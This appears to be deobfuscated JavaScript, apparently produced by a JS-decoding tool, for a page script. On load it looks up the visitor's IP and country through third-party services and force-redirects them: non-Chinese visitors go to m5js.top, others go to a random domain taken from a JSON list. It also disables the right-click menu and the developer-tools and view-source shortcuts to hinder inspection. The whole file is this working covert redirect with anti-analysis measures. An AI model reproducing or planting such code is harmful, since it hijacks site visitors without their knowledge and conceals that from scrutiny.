//Wed Aug 06 2025 07:11:09 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
let redirectTimer;
function checkIP() {
  const _0x2a9f70 = document.createElement("script");
  _0x2a9f70.src = "https://api.ip.sb/jsonip?callback=getIP";
  document.body.appendChild(_0x2a9f70);
}
function getIP(_0x426975) {
  const _0x1173b4 = _0x426975.ip;
  !_0x1173b4 || _0x1173b4.trim() === "" ? checkDomain() : fetchCountry(_0x1173b4);
}
async function fetchCountry(_0x5532a1) {
  try {
    const _0x2d8484 = await fetch("https://ipapi.co/" + _0x5532a1 + "/country/"),
      _0x1a43f5 = await _0x2d8484.text();
    _0x1a43f5.trim() === "CN" ? checkDomain() : redirectToDomain("" + targetDomain + pathAndQueryString);
  } catch (_0x1203c8) {
    console.error("获取IP信息失败:", _0x1203c8);
  }
}
async function checkDomain() {
  try {
    const _0xc279e6 = Date.now(),
      _0x1963ff = "./dm1.json?timestamp=" + _0xc279e6,
      _0x506c46 = await fetch(_0x1963ff),
      _0x3bb682 = await _0x506c46.json(),
      _0x2a14c0 = Math.floor(Math.random() * _0x3bb682.length),
      _0x18b431 = _0x3bb682[_0x2a14c0];
    redirectToDomain("https://" + _0x18b431 + pathAndQueryString);
  } catch (_0x484b66) {
    console.error("从JSON文件获取域名时出错:", _0x484b66);
  }
}
function redirectToDomain(_0x26b639) {
  window.location.href = _0x26b639;
}
const targetDomain = "https://m5js.top",
  pathAndQueryString = window.location.pathname + window.location.search + window.location.hash;
document.addEventListener("DOMContentLoaded", function () {
  checkIP();
  redirectTimer = setTimeout(checkDomain, 5000);
});
window.addEventListener("beforeunload", function () {
  clearTimeout(redirectTimer);
});
document.addEventListener("contextmenu", function (_0x19e9d6) {
  _0x19e9d6.preventDefault();
});
document.addEventListener("keydown", function (_0x3099c8) {
  (_0x3099c8.key === "F12" || _0x3099c8.ctrlKey && _0x3099c8.shiftKey && _0x3099c8.key === "I" || _0x3099c8.ctrlKey && _0x3099c8.shiftKey && _0x3099c8.key === "J" || _0x3099c8.ctrlKey && _0x3099c8.key === "U") && _0x3099c8.preventDefault();
});